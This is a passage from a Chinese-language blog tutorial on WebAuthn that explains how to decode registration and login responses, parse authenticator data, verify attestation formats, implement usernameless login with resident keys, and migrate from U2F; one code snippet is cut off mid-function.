暂时无法实施用户验证，进而会导致依赖方验证失败。你可以在<a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=997538\">这里</a>追踪这个特性的实现情况。</p></blockquote>\n<blockquote>\n<p>对于 <code>extensions</code>，由于目前浏览器支持和应用范围有限，我们不会在这篇文章中涉及，不过你可以看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\n    uvm: true, // 要求认证器返回用户进行验证的方法\n    txAuthSimple: \"Please proceed\" // 在认证器上显示与交易有关的简短消息\n}</pre>\n<p>你可以在<a href=\"https://www.w3.org/2019/01/webauthn-extensions.html\">这个页面</a>了解更多关于 <code>extensions</code> 的信息。</p>\n</blockquote>\n<p>对于 <code>get()</code>，我们其实只有一个可选内容没讲了，即 <code>extensions</code>。和上文一样，我们不会在这篇文章中讨论它。</p>\n<p>就这些了！<span></span></p>\n<h2>手动解个码</h2>\n<p>是时候看看如何手动解码了。我们将会在这一节中讨论认证器返回的数据的结构以及如何正确地解码它们。</p>\n<p>首先我们来看看如何处理注册过程中认证器发回的数据。假设所有 <code>ArrayBuffer</code> 类型的值都被正确地以 Base64 编码，且后端已经将 JSON 的字符串解析为字典。先来复习一下，我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    id: \"ZRBkDBCEtq...9XY8atOcbg\",\n    type: \"public-key\",\n    rawId: \"ZRBkDBCEtq...9XY8atOcbg==\",\n    response: {\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...i5jcmVhdGUifQ==\",\n        attestationObject: \"o2NmbXRkbm9uZWd...xNHuAMzz2LxZA==\"\n    }\n}</pre>\n<p>这里的 <code>id</code> 就是凭证的 ID，如果验证正确，我们最终要将它存储起来并于用户关联。同时可以看到 Base64 编码后的 <code>rawId</code> 其实和 <code>id</code> 是一致的（不过 <code>id</code> 是 Base64URL 编码的）。而 <code>type</code> 则一定是 \"public-key\"。</p>\n<p>不过，我们主要关心的还是 <code>respose</code> 中的两项内容。首先是 <code>clientDataJSON</code>。它的处理比较简单，看名字就知道，它应该是一个 JSON 字符串。</p>\n<blockquote><p>小技巧：如果你看到一个 Base64 编码的字符串以 \"ey\" 开头，那么它大概率是一个 Base64 编码的 JSON。</p></blockquote>\n<p>将<code>clientDataJSON</code> Base64 解码再 JSON 解码之后我们就能得到一个字典：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    challenge: \"NI4i1vsNmP2KHcmyFnBCKRVQPfHgg34SsYZUOPZY2lM\",\n    extra_keys_may_be_added_here: \"do not compare clientDataJSON against a template. See https://goo.gl/yabPex\",\n    origin: \"https://dev.axton.cc\",\n    type: \"webauthn.create\"\n}</pre>\n<p>结构一目了然。在这里，我们需要验证三项内容：</p>\n<ul>\n<li>\n<code>challenge</code> 和之前发送的一致</li>\n<li>\n<code>origin</code> 为创建凭证的页面的源（协议+主机名+端口号，并非 URL）</li>\n<li>\n<code>type</code> 为 \"webauthn.create\"</li>\n</ul>\n<p>同时可以注意到有一个奇怪的 <code>extra_keys_may_be_added_here</code>。这其实是 Google 在 Chrome 中搞的一点小把戏，有一定概率会出现，提醒我们需要将 JSON 解析后再验证键值以防额外插入的键值影响验证。具体信息你可以访问那个 URL 看一看。</p>\n<p>对于 Firefox，我们会多得到两项 <code>clientExtensions</code> 和 <code>hashAlgorithm</code> ，分别指明了客户端扩展数据和签名算法。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"3-4\">{\n    challenge: \"dg6ost6ujhAA0g6WqLe-SOOH-tbhvjW9Sp90aPKlLJI\",\n    clientExtensions: {},\n    hashAlgorithm: \"SHA-256\",\n    origin: \"https://dev.axton.cc\",\n    type: \"webauthn.create\"\n}</pre>\n<p>由于本文不考虑扩展数据，因此我们可以不考虑 <code>clientExtensions</code>。同时由于目前规范中指定的签名算法只有 SHA-256 一种，因此现阶段我们也可以简单地忽略 <code>hashAlgorithm</code>。</p>\n<p><code>clientDataJSON</code> 很简单地就处理完了。接下来我们要来看看 <code>attestationObject</code>。先来看看 <code>attestationObject</code> 的结构图示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"attestationObject 的结构\" width=\"1056\" height=\"532\" class=\"aligncenter size-full wp-image-2245\"></a>\n<p><code>attestationObject</code> 是 CBOR 编码后再被 Base64 编码的，因此我们需要额外对其进行 CBOR 解码。</p>\n<blockquote><p>CBOR (Concise Binary Object Representation, 简明二进制对象表示) 是一种多应用于物联网领域的编码方式，你可以将它看作体积更小、更方便物联网传输的二进制 JSON。大部分语言都可以找到对应的 CBOR 解码库。</p></blockquote>\n<p>我们当然不会手解 CBOR，直接来看看解开之后的样子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    fmt: \"none\",\n    attStmt: {},\n    authData: [211, 217, 43, 24, 199, ..., 97, 238, 166, 67, 107]\n}</pre>\n<p>这些键值的含义如下：</p>\n<ul>\n<li>\n<code>fmt</code>：标明证明的格式。WebAuthn 预定义了几种格式，分别为：\n<ul>\n<li>\n<code>none</code>：没有证明</li>\n<li>\n<code>packed</code>：为 WebAuthn 优化的证明格式</li>\n<li>\n<code>android-safetynet</code>：Android 使用的格式</li>\n<li>\n<code>android-key</code>：又是 Android 使用的格式</li>\n<li>\n<code>fido-u2f</code>：FIDO U2F 认证器使用的格式</li>\n<li>\n<code>tpm</code>：TPM 可信平台模块使用的格式</li>\n</ul>\n</li>\n<li>\n<code>attStmt</code>：证明对象，具体格式根据 <code>fmt</code> 的不同会有所不同</li>\n<li>\n<code>authData</code>：包含公钥、签名计数等来自认证器的数据</li>\n</ul>\n<p>诶，例子里的 <code>attStmt</code> 怎么是空的？还记得之前说的吗？大部分情况下，<strong>如果依赖方不要求证明，那么认证器不会签名挑战</strong>，于是 <code>fmt</code> 会变为 \"none\"，<code>attstmt</code> 会为空。如果不是高安全要求，我们可以只对这一种情况做支持。</p>\n<blockquote><p>注意，部分情况下 Firefox 会在不要求证明（即 <code>attestation</code> 为 \"none\"）时会返回 <code>fmt</code> 为 \"packed\" 的证明。<strong>这是符合规范的。</strong>此时认证器会进行自证明，你可以视情况进行处理。具体可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>对于非 \"none\" 的 <code>fmt</code> 我们稍后再谈，现在我们先来看看 <code>authData</code>。来复习一下 <code>authData</code> 的结构：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"authData 的结构\" width=\"1056\" height=\"384\" class=\"aligncenter size-full wp-image-2240\"></a>\n<p>对于它的解码比较简单粗暴，我们要做的就是根据图示将它切开，然后适当地转换类型。其中各部分的含义如下：</p>\n<ul>\n<li>\n<code>rpIdHash</code>：如其名，SHA-256 的 <code>rpId</code>，长度 32 字节</li>\n<li>\n<code>flags</code>：标识认证状态，长度 1 字节。其中 8 位分别为：\n<ul>\n<li>\n<code>ED</code>：是否有扩展数据</li>\n<li>\n<code>AT</code>：是否包含 <code>attestedCredentialData</code>。通常注册认证器时会包含 <code>attestedCredentialData</code>，而验证时不包含</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>\n<code>UV</code>：用户是否已验证</li>\n<li>保留位</li>\n<li>\n<code>UP</code>：用户是否在场</li>\n</ul>\n</li>\n<li>\n<code>signCount</code>：签名计数，长度 4 字节</li>\n<li>\n<code>attestedCredentialData</code>：包含公钥等凭据数据，变长。其结构如下：\n<ul>\n<li>\n<code>aaguid</code>：认证器的 AAGUID (Authenticator Attestation GUID)，对于同一型号的认证器，它们的 AAGUID 是相同的</li>\n<li>\n<code>credentialIdLength</code>：标识 <code>credentialId</code> 的长度，长度 2 字节</li>\n<li>\n<code>credentialId</code>：凭证 ID，和 <code>rawId</code> 一致，长度由 <code>credentialIdLength</code> 定义</li>\n<li>\n<code>credentialPublicKey</code>：CBOR 编码的 COSE 格式的凭证公钥，变长</li>\n</ul>\n</li>\n<li>\n<code>extensions</code>：扩展数据，变长，本文不讨论</li>\n</ul>\n<blockquote><p>出于隐私考虑，如果不要求证明，认证器会以 0 填充 AAGUID。</p></blockquote>\n<p>如果你的后端在使用 Node.js，这里有个工具函数可以帮你完成这一步（不考虑 <code>extensions</code>）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function parseAuthData(buffer){\n    let rpIdHash = buffer.slice(0, 32);\n    buffer = buffer.slice(32);\n  \n    let flagsBuf = buffer.slice(0, 1);\n    buffer = buffer.slice(1);\n\n    let flagsInt = flagsBuf[0];\n    let flags = {\n        up: !!(flagsInt &amp; 0x01),\n        uv: !!(flagsInt &amp; 0x04),\n        at: !!(flagsInt &amp; 0x40),\n        ed: !!(flagsInt &amp; 0x80),\n        flagsInt\n    }\n\n    let counterBuf = buffer.slice(0, 4);\n    buffer = buffer.slice(4);\n  \n    let counter = counterBuf.readUInt32BE(0);\n\n    let aaguid = undefined;\n    let credID = undefined;\n    let COSEPublicKey = undefined;\n\n    if(flags.at) {\n        aaguid = buffer.slice(0, 16);\n        buffer = buffer.slice(16);\n\n        let credIDLenBuf = buffer.slice(0, 2);\n        buffer = buffer.slice(2);\n\n        let credIDLen = credIDLenBuf.readUInt16BE(0);\n        credID = buffer.slice(0, credIDLen);\n\n        buffer = buffer.slice(credIDLen);\n        COSEPublicKey = buffer;\n    }\n\n    return {rpIdHash, flagsBuf, flags, counter, counterBuf, aaguid, credID, COSEPublicKey}\n}</pre>\n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>解开后，依赖方至少需要做四件事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>存储签名计数</li>\n<li>存储公钥</li>\n</ol>\n<blockquote><p>签名计数不一定从 0 开始。</p></blockquote>\n<p>对于公钥，也就是 <code>credentialPublicKey</code>，我们需要多一次 CBOR 解码，然后就可以得到类似这样的公钥：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    kty: \"EC\",\n    alg: \"ECDSA_w_SHA256\",\n    crv: \"P-256\",\n    x: \"ZGQALNfqo0L7HFYQHFHCS/X5db49z0ePnuQEs3w3X8w=\",\n    y: \"6qYxhnjYuez/Q8N6vX7nIIGfxFWdZ25NzQfZYuYOalA=\"\n}</pre>\n<p>然后可以选择适当的方法将其存储起来，之后的步骤本文就不再赘述了。现在，将目光拉回来，让我们看看包含证明的 <code>attestationObject</code> 是怎么样的。我们来看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    fmt: \"packed\",\n    attStmt: {\n        alg: -7,\n        sig: [48, 70, 2, 33, 0, ..., 132, 78, 46, 100, 21],\n        x5c: [\n            [48, 130, 2, 189, 48, 130, 1, 165, 160, 3, ..., 177, 48, 125, 191, 145, 24, 225, 169, 41, 248]\n        ]\n    },\n    authData: [211, 217, 43, 24, 199, ..., 158, 54, 87, 126, 54]\n}</pre>\n<p>这里有一个使用 \"packed\" 格式的证明。此时，<code>attStmt</code> 中包含三个值：</p>\n<ul>\n<li>\n<code>alg</code>：签名算法</li>\n<li>\n<code>sig</code>：签名值</li>\n<li>\n<code>x5c</code>：X.509 编码的证书链</li>\n</ul>\n<p>我们不会在这一节中详述对签名的验证。要了解更多信息，你可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。现在，让我们来看看如何处理验证过程中认证器发回的数据。我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    id: \"hmqdxPLit9...BWeVxZqdvU\",\n    type: \"public-key\",\n    rawId: \"hmqdxPLit9V...BWeVxZqdvU=\",\n    response: {\n        authenticatorData: \"09krGMcWTf...UFAAAABA==\",\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...XRobi5nZXQifQ==\",\n        signature: \"UsXZV3pvT3np8btj6V0g...WBkaqyt88DrD40qh+A==\",\n        userHandle: \"MmYxNWYzZjQyZjM...Tg2ZDY4NzhlNw==\"\n    }\n}</pre>\n<p><code>id</code>, <code>rawId</code> 和 <code>type</code> 和之前一样，这里就不再赘述了。让我们来看看 <code>response</code>。首先是 <code>clientDataJSON</code>，和之前的解法一样，要验证的内容也一样，只是 <code>type</code> 从 \"webauthn.create\" 变成了 \"webauthn.get\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    challenge: \"bnkd2CmrEuvKnAFXs2QlC3SKlg4XFvGtP4HJL1yEWyU\",\n    origin: \"https://dev.axton.cc\",\n    type: \"webauthn.get\"\n}</pre>\n<p>然后是 <code>userHandle</code>。前面讲过，这是认证器在创建凭证时的用户 ID。如果用户在使用 U2F 认证器，很可能这一项为空，所以大部分情况下我们不关心这一项。</p>\n<p>接着来看 <code>authenticatorData</code>。这其实就是之前的 <code>attestedCredentialData</code>，只是这次不包含公钥。以相同的方式切开数据，我们应该可以得到 <code>rpIdHash</code>, <code>flags</code>和 <code>signCount</code> 三项。此时，依赖方至少需要做这三样事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>验证签名计数大于之前存储的计数，并更新存储的计数</li>\n</ol>\n<blockquote><p>如果签名计数比之前的小，那么这个认证器很可能是伪造的，应该中止验证并返回验证失败。同时，签名计数不一定每次按 1 递增，通常只要计数比此前的大就认为计数检查通过。</p></blockquote>\n<p>最后，我们来看 <code>signature</code>，也就是签名。不过这个签名不是简单的对挑战的签名，具体算法如图所示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"签名过程\" width=\"1034\" height=\"587\" class=\"aligncenter size-full wp-image-2231\"></a>\n<p>计算签名时，认证器会将 <code>authenticatorData</code> 与 <code>clientDataHash</code>（也就是 <code>clientDataJSON</code> 的 SHA-256 Hash）拼接起来，并使用对应的私钥签名。依赖方应该使用对应的公钥将其解密，并验证内容是否是 <code>authenticatorData</code> 与 <code>clientDataHash</code> 的拼接。这部分的计算不在本文的讨论范围内。</p>\n<p>最后，如果全部验证通过，返回验证成功。<span></span></p>\n<h2>验证认证器</h2>\n<p>WebAuthn 已经很安全了，但有的时候我们还要让它更安全一点。比如，如果用户在使用伪造的或是自制的认证器，认证器的安全性就得不到保证。此时，依赖方就需要验证认证器是否是可信的认证器。</p>\n<blockquote><p>这一过程仅发生在注册认证器时。此时，如果认证器验证通过，就可以存储公钥，后续步骤和之前描述的一致。</p></blockquote>\n<blockquote><p>再次说明，如果不是对安全性有极高的要求，向认证器索取证明以验证认证器是否可信是没有必要的。此外，验证认证器需要依赖方自行维护可信认证器列表，大大增加了维护的复杂性。</p></blockquote>\n<p>在调用 <code>navigator.credentials.create()</code> 时，我们可以将 <code>attestation</code> 设置为非 \"none\" 来向认证器索取证明。除无证明外，WebAuthn 定义了四种证明方式：</p>\n<ul>\n<li>Basic Attestation (Basic) ：基础的证明方式，认证器会使用认证器私钥签名</li>\n<li>Self Attestation (Self) ：自证明，认证器会使用凭证私钥签名</li>\n<li>Attestation CA (AttCA) ：认证器会使用多个证明私钥之一签名</li>\n<li>Elliptic Curve based Direct Anonymous Attestation (ECDAA) ：通过 <a href=\"https://en.wikipedia.org/wiki/Direct_Anonymous_Attestation\">DAA</a> 实现的匿名证明</li>\n</ul>\n<blockquote><p>和验证过程一样，这里签名的目标是 <code>authenticatorData</code> 和 <code>clientDataHash</code> 的连接。</p></blockquote>\n<p>还记得 <code>create()</code> 时 <code>attestation</code> 可选的三个值吗？这个值会决定认证器最终使用哪种方式进行证明。复习一下：</p>\n<ul>\n<li>\n<code>none</code>：大部分情况下认证器会选择不进行证明，部分认证器会进行自证明。此时 AAGUID 会被 0 填充</li>\n<li>\n<code>indirect</code>：认证器会试图通过替换 AAGUID 和选择合适的证明方式来进行匿名证明，具体方式由认证器选择</li>\n<li>\n<code>direct</code>：认证器会提供最直接的证明信息</li>\n</ul>\n<p>注意，大部分情况下，当认证器需要向依赖方证明自己可信时需要提供认证器公钥，<strong>这会触发浏览器提示，只有用户同意后认证器才会进行证明，否则认证器将不提供证明。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"浏览器提示\" width=\"446\" height=\"283\" class=\"aligncenter size-full wp-image-2217\"></a>\n<blockquote><p>为什么浏览器会说“安全密钥的品牌和型号”？事实上，为了避免用户通过认证器证书被跨依赖方追踪，FIDO 要求使用相同认证器证书的认证器的数量不能少于 100,000。于是大部分认证器厂商会选择<strong>让同一型号的认证器共用同一份证书。</strong>因此，浏览器的会询问用户是否同意“查看安全密钥的品牌和型号”。</p></blockquote>\n<blockquote><p>Android Safety Net 不会向用户询问是否同意，而是会静默进行证明。</p></blockquote>\n<p>当证明不为空时，依赖方收到数据后根据 <code>attestationObject.fmt</code> 的不同，需要选择不同的验证方式来验证认证器的可信情况。出于篇幅原因，这里我们不会讨论每一种 <code>fmt</code> 的验证方式，更多信息你可以查阅 <a href=\"https://www.w3.org/TR/webauthn/#defined-attestation-formats\">W3C 文档</a>。</p>\n<p>当 <code>fmt</code> 为 <code>packed</code> 时，<code>attestationObject.attStmt</code> 可能会有三种格式：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">// 自证明\n{\n    alg, // 算法\n    sig // 签名\n}\n// 基础或证明 CA 证明\n{\n    alg,\n    sig,\n    x5c // X.509 证书链\n}\n// 椭圆曲线证明\n{\n    alg,\n    sig,\n    ecdaaKeyId // ECDAA-Issuer 公钥标识符\n}</pre>\n<p>此时，依赖方需要检查证书符合预期格式并检查证书是否在可信链上。首先，如果证明中既没有 <code>ecdaaKeyId</code> 也没有 <code>x5c</code>，就说明这个证明使用的是自证明，只需使用认证器提供的公钥验证即可；如果有 <code>x5c</code>，那么就需要验证 <code>x5c</code> 中的证书是否在可信链上。将 <code>x5c</code> 中的每个证书以 Base64 编码，按 64 个字符切开，并在头尾加上 <code>-----BEGIN CERTIFICATE-----</code> 和 <code>-----END CERTIFICATE-----</code>就能得到一个证书字符串了。之后，依赖方需要验证证书是否可信。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function base64ToPem(b64cert){\n    let pemcert = '';\n    for(let i = 0; i \n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>至于 <code>ecdaaKeyId</code>，由于目前应用较少，处理方法可能需要你另寻资料了。检查证书的具体步骤已经超出了本文的范围，具体可以查阅<a href=\"https://medium.com/@herrjemand/verifying-fido2-packed-attestation-a067a9b2facd\">这篇文章</a>（英文）。</p>\n<blockquote><p>你可以在 <a href=\"https://fidoalliance.org/metadata/\">FIDO Metadata Service</a> 找到各大厂商认证器的可信证书链。</p></blockquote>\n<p>当在 Android 上调起 WebAuthn 时，大部分情况下 <code>fmt</code> 将会为 <code>safety-net</code>。此时 <code>attestationObject.attStmt</code> 的结构会是：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    ver: \"200616037\",\n    response: {\n        type: \"Buffer\",\n        data: [101, 121, 74, 104, 98, ..., 115, 104, 104, 82, 65]\n    }\n}</pre>\n<p>此时，<code>clientDataJSON</code> 中还会出现 <code>androidPackageName</code> 键，值是调起 WebAuthn 验证的应用的包名，如 Chrome 就是 \"com.android.chrome\"。</p>\n<p>在这个证明中，<code>data</code> 其实是一个 JWT 字符串，我们可以将它编码为字符串并将其按照 JWT 进行解码（别忘了验证 JWT 签名）。最终我们会得到一个类似这样的 Payload：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    nonce: \"0QAurN4F9wik6GEkblDJhGuf4kuaqZn5zaaxlvD1hlA=\",\n    timestampMs: 1584950686460,\n    apkPackageName: \"com.google.android.gms\",\n    apkDigestSha256: \"2BQHno+bmWWwdLUYylS8HLt5ESJzci3nt2uui71ojyE=\",\n    ctsProfileMatch: true,\n    apkCertificateDigestSha256: [\n        \"8P1sW0EPicslw7UzRsiXL64w+O50Ed+RBICtay2g24M=\"\n    ],\n    basicIntegrity: true,\n    evaluationType: \"BASIC\"\n}</pre>\n<p>其中包含了有关设备状态的一些信息。比如说，如果 <code>ctsProfileMatch</code> 为 <code>false</code>，那么该设备很有可能被 root 了。对于高安全要求的场景，我们可以视情况进行验证。</p>\n<p>同时我们可以在 JWT Header 中验证证明的有效性。我们应该能取得这样的 Header：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    alg: \"RS256\",\n    x5c: [\n        \"MIIFkzCCBHugAwIBAgIR...uvlyjOwAzXuMu7M+PWRc\",\n        \"MIIESjCCAzKgAwIBAgIN...UK4v4ZUN80atnZz1yg==\"\n    ]\n}</pre>\n<p>这里的结构就和上方的 <code>x5c</code> 验证类似了。具体步骤可以参考<a href=\"https://medium.com/@herrjemand/verifying-fido2-safetynet-attestation-bd261ce1978d\">这篇文章</a>（英文）。</p>\n<p>其他所有格式的验证方式也都可以在<a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">这篇文章</a>（英文）中找到。<span></span></p>\n<h2>无用户名登录</h2>\n<p>认证器已经代替了密码，可是这还不够！在进行第一因素认证（即使用 WebAuthn 登录）时，我们还是需要输入用户名，然后才能进行身份认证。懒惰是第一生产力，我们能不能不输入用户名就进行身份认证呢？实际上，大部分认证器都允许我们无用户名登录。<strong>而这一特性的核心就是 Resident Key 客户端密钥驻留。</strong></p>\n<p>你可以思考一下，为什么普通的 WebAuthn 为什么不能实现无用户名登录？事实上，大部分认证器为了实现无限对公私钥，会将私钥通过 Key Warp 等技术加密后包含在凭证 ID 中发送给依赖方，这样认证器本身就不用存储任何信息。不过，这就导致需要身份认证时，依赖方必须通过用户名找到对应的凭证 ID，将其发送给认证器以供其算出私钥。</p>\n<blockquote><p>Yubikey 实现了一个基于 HMAC 的算法，认证器可以在私钥不离开认证器的前提下（常规的 Key Warp 算法中实际上私钥离开了认证器）通过一些输入和凭证 ID 重新计算私钥，你可以阅读<a href=\"https://www.yubico.com/blog/yubicos-u2f-key-wrapping/\">这篇文章</a>了解更多。</p></blockquote>\n<blockquote><p>客户端通过凭证 ID 查找对应认证器的算法根据系统的不同是不同的。通常凭证 ID 中会包含认证器信息，因此系统可以通过凭证 ID 找到对应的认证器。</p></blockquote>\n<p>要避免输入用户名，我们可以要求认证器将私钥在自己的内存中也存储一份。这样，依赖方无需提供凭证 ID，认证器就可以通过依赖方 ID 找到所需的私钥并签名公钥。以下是具体流程：</p>\n<p>注册时：</p>\n<ol>\n<li>依赖方请求新建凭证，同时要求启用客户端密钥</li>\n<li>认证器生成一对公私钥，并将私钥存储在永久内存中且与依赖方 ID 及用户 ID 绑定，随后将公钥发送给依赖方以供存储</li>\n<li>依赖方将用户 ID 即公钥与用户绑定</li>\n</ol><p>验证时：</p>\n<ol>\n<li>依赖方请求验证，但不必提供除依赖方 ID 以外的更多信息</li>\n<li>用户选择认证器</li>\n<li>认证器根据依赖方 ID 找到对应私钥</li>\n<li>如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录</li>\n<li>确定私钥后，认证器签名挑战并将其返回，同时返回用户 ID</li>\n<li>依赖方通过用户 ID 找到对应用户并用对应公钥检查签名，正确则允许对应用户登录</li>\n</ol><blockquote><p>可以看到，这个特性同时要求认证器存储用户 ID，即上面提到过的 <code>userHandle</code>。依赖方需要根据此信息找到对应用户，因此不支持 <code>userHandle</code> 的 U2F 认证器无法进行无用户名登录。</p></blockquote>\n<blockquote><p>如之前所说，<strong>认证器能永久存储的私钥数量是有限的</strong>，因此只应在真正需要无用户名登录的时候启用此特性。</p></blockquote>\n<blockquote><p>目前暂时没有办法检测认证器是否支持客户端密钥驻留，因此在无用户名验证失败时应 fallback 至常规的 WebAuthn 验证，即向用户询问用户名。</p></blockquote>\n<p>现在让我们来看看如何实现这一特性吧。首先，调用 <code>navigator.credentials.create()</code> 时我们需要注意两个参数：<code>requireResidentKey</code> 必须为 <code>true</code>，<code>userVerification</code> 必须为 \"required\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"5-6\">navigator.credentials.create({\n    publicKey: {\n        ...\n        authenticatorSelection: {\n            requireResidentKey: true,\n            userVerification: \"required\"\n            ...\n        },\n        ...\n    }\n})</pre>\n<blockquote><p>Windows Hello <strong>似乎</strong>会存储所有已注册的凭据，因此无论是否指定 <code>requireResidentKey</code>，你都可以通过 Windows Hello 进行无用户名登录。</p></blockquote>\n<p>随后，浏览器会询问用户是否允许认证器存储私钥。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"浏览器提示\" width=\"445\" height=\"285\" class=\"aligncenter size-full wp-image-2208\"></a>\n<p>如果用户同意，认证器会存储私钥，并和普通的 WebAuthn 一样返回信息。不过，依赖方收到数据之后，只需将公钥、用户 ID 与用户关联起来，而不必再将凭证 ID 与用户关联起来。至此注册完成。</p>\n<p>之后，在用户请求登录时，无需再向依赖方提供用户名。同时在传入 <code>navigator.credentials.get()</code> 的参数中也有两个需要注意：<code>userVerification</code> 必须为 \"required\"，同时 <code>allowCredentials</code> 必须为空。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"4-5\">navigator.credentials.get({\n    publicKey: {\n        ...\n        userVerification: \"required\",\n        allowCredentials: [],\n        ...\n    }\n})</pre>\n<blockquote><p>Android 暂不支持无用户名验证，空的 <code>allowCredentials</code> 会导致浏览器返回 <code>NotSupportedError</code> 错误。</p></blockquote>\n<p>此时，认证器会根据依赖方 ID 找到对应的私钥。如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录。用户选择后，认证器就会使用对应的私钥签名挑战并将其返回。此时，<code>userHandle</code> 一定不为空。</p>\n<p>依赖方收到数据后，需要将 <code>userHandle</code> 作为用户 ID 找到对应的用户，并使用对应的公钥验证签名。如果验证成功，则认为对应的用户身份认证成功，依赖方可以允许其登录。至此验证结束。</p>\n<blockquote><p>有的时候你可能会需要清除认证器中的密钥。绝大多数认证器都提供了对应的软件以供清除存储的密钥，但大部分情况下这会重置整个认证器，这意味着相关认证器此前的所有凭证均会失效。因此建议不要将日常使用的认证器作为开发测试用的认证器。</p></blockquote>\n<h2>从 U2F 认证迁移</h2>\n<p>如果你的服务此前提供了 U2F 第二因素认证，你可能会希望在将依赖方从 U2F 升级到 WebAuthn 时用户此前注册的 U2F 认证器仍然可用而无需重新注册。由于 WebAuthn 向后兼容 U2F 设备，用户是可以继续使用原有的 U2F 认证器的。不过，由于 WebAuthn 的依赖方 ID 与 U2F 的 <code>appid</code> 并不一定相同，你需要将原有的 U2F <code>appid</code> 随 WebAuthn 流程一起传递给认证器，认证器才能使用正确的私钥进行响应。</p>\n<p>要实现这一点，我们只需要在注册及认证仪式中使用 WebAuthn 的 <code>appid</code> 扩展。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\n    appid: \"https://example.com\" //U2F appid\n}</pre>\n<p>此时认证器便可以得到正确的私钥，之后的流程与正常情况一致；依赖方除了正常的 WebAuthn 流程外，不需要再做任何其它操作。</p>\n<h2>拓展阅读</h2>\n<p>我们的 WebAuthn 之旅到这里就真的结束了。不过，你仍然可以自行探究，了解更多。<strong>本文只是一个粗浅的使用指南</strong>，而被称为“Web 身份认证的未来”的 WebAuthn 的深层还要很多细节值得我们挖掘学习，不过本文不会再继续讨论了。</p>\n<p>如果你想了解更多关于 WebAuthn 的信息，最好的方法是直接阅读 <a href=\"https://www.w3.org/TR/webauthn\">W3C 规范</a>。此外，Yubico 也提供了不错的 <a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn 文档</a>。</p>\n<p>要了解更多认证器存储凭证的信息，你可以阅读<a href=\"https://duo.com/labs/tech-notes/how-security-keys-store-credentials\">这篇文章</a>（英文）。</p>\n<p>如果你想了解更多 Android Safety Net 是怎样运作的，可以观看<a href=\"https://youtu.be/8lv_9mydrjg\">这个视频</a>，并通过 <a href=\"https://developer.android.com/training/safetynet/attestation\">Google 的文档</a>了解 Android Safety Net 的更多信息。</p>\n<p>如果你想方便地调试 WebAuthn，<a href=\"https://webauthn.me/\">webauthn.me</a> 提供了一个非常直观方便的<a href=\"https://webauthn.me/debugger\">调试器</a>。</p>\n<h1>参考资料</h1>\n<p><a href=\"https://www.w3.org/TR/webauthn\">WebAuthn Level 1 规范 - W3C</a><br><a href=\"https://github.com/w3c/webauthn\">WebAuthn Level 2 草案 - W3C</a><br><a 